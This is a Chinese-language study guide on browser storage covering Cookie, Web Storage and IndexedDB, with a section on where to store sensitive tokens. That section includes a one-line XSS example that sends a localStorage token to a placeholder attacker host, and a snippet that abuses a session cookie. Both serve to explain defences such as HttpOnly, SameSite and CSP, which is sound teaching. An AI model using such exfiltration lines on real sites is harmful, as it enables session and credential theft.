# 浏览器存储

### 理解路径

浏览器存储不是单一能力，而是一组生命周期、容量、读写方式和安全属性不同的宿主 API。选择时先判断数据是否需要随请求发送，再判断数据规模、结构化程度、生命周期和安全风险。

### 浏览器前端存储有哪些方式？

常见前端存储方式包括 Cookie、Web Storage 和 IndexedDB。

1. Cookie：既能被浏览器保存，也会随匹配请求发送给服务器。
2. `localStorage`：同源下持久保存字符串数据。
3. `sessionStorage`：保存当前页面会话内的字符串数据。
4. IndexedDB：异步、结构化、本地数据库能力。

它们都能保存客户端状态，但目标不同：Cookie 更偏服务端会话协作，Web Storage 更偏小型客户端状态，IndexedDB 更偏大量结构化数据。

### Web Storage、Cookie、IndexedDB 怎么比较？

| 能力 | Cookie | localStorage | sessionStorage | IndexedDB |
| --- | --- | --- | --- | --- |
| 容量 | 较小 | 较小到中等 | 较小到中等 | 较大 |
| 生命周期 | 可设置过期 | 持久，直到清理 | 标签页会话 | 持久，直到清理 |
| 是否随请求发送 | 是 | 否 | 否 | 否 |
| API | 字符串 | 同步字符串 API | 同步字符串 API | 异步结构化存储 |
| 适用 | 会话标识、小型服务端需要字段 | 小型客户端偏好 | 单标签临时状态 | 大量结构化数据 |

### Cookie 适合存什么？

Cookie 的核心特点是会随匹配的 HTTP 请求发送到服务器，所以适合存放服务端需要读取的小型状态，例如会话标识。

关键属性：

1. `HttpOnly`：禁止 JavaScript 读取，降低 XSS 窃取风险。
2. `Secure`：只在 HTTPS 下发送。
3. `SameSite`：限制跨站请求携带 Cookie，降低 CSRF 风险。
4. `Expires` / `Max-Age`：控制过期时间。

不应把大量客户端数据放进 Cookie，因为它会增加请求体积，并且容量较小。

### localStorage 和 sessionStorage 有什么区别？

`localStorage` 和 `sessionStorage` 都是同步字符串 API，不会随 HTTP 请求发送。

常用 API：

| API | 作用 |
| --- | --- |
| `setItem(key, value)` | 写入字符串值 |
| `getItem(key)` | 读取字符串值，不存在时返回 `null` |
| `removeItem(key)` | 删除指定键 |
| `clear()` | 清空当前存储区域 |
| `key(index)` | 按序号读取键名 |

区别：

1. `localStorage` 持久保留，直到用户或代码清理。
2. `sessionStorage` 绑定到当前页面会话，通常随标签页关闭而清除。
3. 二者只能直接存字符串，复杂对象需要序列化。
4. 二者都是同步 API，不适合大量频繁读写。

```js
const profile = { theme: 'dark' }
localStorage.setItem('profile', JSON.stringify(profile))

const savedProfile = JSON.parse(localStorage.getItem('profile') || '{}')
console.log(savedProfile.theme)
```

### sessionStorage 同源跨窗口可以共享吗？

`sessionStorage` 不像 `localStorage` 那样在所有同源标签页之间共享。它按页面会话隔离，通常每个标签页有自己的存储区域。

但存在一个容易混淆的情况：如果新页面由当前页面打开，例如通过 `<a target="_blank">` 或 `window.open()`，并且浏览器保留了 opener 关系，新页面初始时可能得到一份当前页面 `sessionStorage` 的拷贝。之后两个页面的 `sessionStorage` 会各自独立修改，不会继续同步。

如果不希望新页面拿到这份初始拷贝，可以使用 `rel="noopener"` 或显式断开 opener 关系。

### IndexedDB 适合什么场景？

IndexedDB 是浏览器提供的异步结构化存储，适合大量、复杂、需要索引的数据。

常见场景：

1. 离线应用缓存业务数据。
2. 大量列表、草稿或本地数据库。
3. 需要按字段建立索引并查询。
4. PWA 与 Service Worker 配合存储离线数据。

IndexedDB API 比 Web Storage 复杂，但不会阻塞主线程读写流程，更适合大数据量。

### 敏感令牌能放在浏览器存储里吗？

敏感令牌不是绝对不能出现在浏览器里，因为 Web 登录态最终总要让浏览器证明"这个请求属于当前用户"。真正要判断的是两个问题：

1. 这个令牌能不能被 JavaScript 读取？
2. 浏览器会不会在跨站或同站请求里自动携带它？

`localStorage`、`sessionStorage` 和普通可读 Cookie 的共同问题是：它们都能被页面脚本读取。一旦页面存在 XSS，攻击脚本可以直接取走令牌，再把令牌发到攻击者服务器。

```js
fetch('https://attacker.example/steal?token=' + localStorage.getItem('token'))
```

所以长期有效的 access token、refresh token 或会话密钥，不应持久化在 `localStorage`、`sessionStorage` 或普通可读 Cookie 中。

`HttpOnly` Cookie 解决的是"被脚本直接读走"的问题：

```http
Set-Cookie: sid=abc123; HttpOnly; Secure; SameSite=Lax
```

设置 `HttpOnly` 后，JavaScript 不能通过 `document.cookie` 读取 `sid`。但浏览器仍会在匹配请求中自动带上这个 Cookie，所以 XSS 脚本虽然读不到 Cookie，仍可能借当前登录态发起业务请求：

```js
fetch('/api/transfer', {
  method: 'POST',
  body: JSON.stringify({ amount: 1000 })
})
```

因此 `HttpOnly` Cookie 不是"完全安全"，它只是把风险从"令牌被偷走后到处复用"，降低为"攻击脚本只能在当前页面上下文里滥用登录态"。这仍然需要治理 XSS 和业务权限。

Cookie 还会带来另一类风险：CSRF。因为 Cookie 会被浏览器自动携带，攻击者可能诱导用户访问恶意页面，再让恶意页面向目标站点发请求。浏览器如果携带了登录 Cookie，服务端就可能误以为这是用户本人操作。`SameSite`、CSRF token、校验 `Origin` / `Referer` 都是为了降低这类风险。

| 方案 | XSS 直接读取令牌 | XSS 借登录态发请求 | CSRF 风险 | 适合场景 |
| --- | --- | --- | --- | --- |
| `localStorage` / `sessionStorage` 存 token | 高 | 高 | 较低，因为通常要手动加 `Authorization` 头 | 不适合长期敏感令牌 |
| 普通可读 Cookie 存 token | 高 | 高 | 高，需要额外防护 | 不适合敏感令牌 |
| `HttpOnly` Cookie 存会话标识 | 读不到 Cookie | 仍可能 | 需要 `SameSite` / CSRF 防护 | 常见服务端会话方案 |
| 内存中保存短期 access token | 页面刷新后丢失 | 当前页面仍可能 | 取决于请求方式 | 适合降低持久化泄露窗口 |

更稳妥的设计通常是组合方案：

1. 服务端会话标识或 refresh token 放在 `HttpOnly`、`Secure`、`SameSite` Cookie 中。
2. access token 尽量短有效期，必要时只保存在内存中，不长期持久化。
3. 使用 `SameSite`、CSRF token、双重提交 Cookie 或 `Origin` / `Referer` 校验处理 CSRF。
4. 严格治理 XSS，例如输出转义、避免危险 HTML 注入、使用 CSP 降低脚本注入影响。
5. 高风险操作增加二次验证、短时凭证或服务端风控，不能只依赖"用户已登录"。

一句话总结：`localStorage` 主要怕 XSS 直接偷走 token；Cookie 主要要处理自动携带带来的 CSRF；`HttpOnly` Cookie 能防脚本读取，但不能替代 XSS、CSRF 和业务权限防护。

### Cookie 和 Session 有什么区别？

Cookie 是浏览器端保存并随请求发送的小型数据；Session 通常是服务端保存用户状态的机制。二者经常配合使用：浏览器 Cookie 保存一个会话标识，服务器根据这个标识找到对应 Session 数据。

| 维度 | Cookie | Session |
| --- | --- | --- |
| 存储位置 | 浏览器端 | 服务端 |
| 传输方式 | 匹配请求会自动携带 | 不直接传输完整 Session 数据 |
| 安全边界 | 可通过 `HttpOnly`、`Secure`、`SameSite` 加固 | 依赖服务端存储、过期和会话管理 |
| 容量压力 | 受浏览器 Cookie 限制，且增加请求体积 | 占用服务端存储资源 |
| 典型用途 | 会话标识、少量服务端需要字段 | 登录状态、用户临时状态 |

Cookie 不等于 Session。Cookie 是浏览器机制，Session 是状态管理方案；只是传统 Web 应用常用 Cookie 里的 Session ID 关联服务端 Session。

### 带过期时间的 localStorage

```js
function setWithExpiry(key, value, ttl) {
  const record = {
    value,
    expiresAt: Date.now() + ttl
  }

  localStorage.setItem(key, JSON.stringify(record))
}

function getWithExpiry(key) {
  const raw = localStorage.getItem(key)
  if (!raw) return null

  const record = JSON.parse(raw)
  if (Date.now() > record.expiresAt) {
    localStorage.removeItem(key)
    return null
  }

  return record.value
}
```

## 参考来源

- [MDN: Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
- [MDN: Window.localStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/localStorage)
- [MDN: Window.sessionStorage](https://developer.mozilla.org/en-US/docs/Web/API/Window/sessionStorage)
- [MDN: IndexedDB API](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API)
- [MDN: Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies)
- [MDN: SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value)
